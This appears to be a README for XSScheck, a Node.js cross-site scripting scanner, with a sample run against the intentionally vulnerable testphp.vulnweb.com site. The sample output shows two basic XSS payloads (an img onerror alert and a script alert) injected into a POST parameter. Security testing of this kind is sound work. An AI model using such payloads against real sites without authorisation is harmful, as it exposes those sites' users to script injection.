# XSScheck

XSS scanner by nodejs


## Usage

At first, make sure `phantom.js` in your PATH, then
```
node xsscheck.js
```


## Example

```
 > node xsscheck.js
 
=======> XSScheck Power By VLVK <========

[?] Select method: [G]ET or [P]OST (G/P): P
[?] Enter URL:
[?] > http://testphp.vulnweb.com/search.php?test=query
[?] Enter Parameters:
[?] > searchFor=2&goButton=go
[?] Enter location of Payloadlist (payloads.txt)
[?] >
[+] Use Default payloads...
====================
Path: http://testphp.vulnweb.com/search.php?test=query
Method: Post
Parameter: searchFor
Payload: <img src="x" onerror="alert(/xss/)">
Data: searchFor=2<img src="x" onerror="alert(/xss/)">&goButton=go
====================
====================
Path: http://testphp.vulnweb.com/search.php?test=query
Method: Post
Parameter: searchFor
Payload: <script>alert(/xss/)</script>
Data: searchFor=2<script>alert(/xss/)</script>&goButton=go
====================
```


## Todo

- [ ] concurrent_control
- [ ] 10&16hex_encode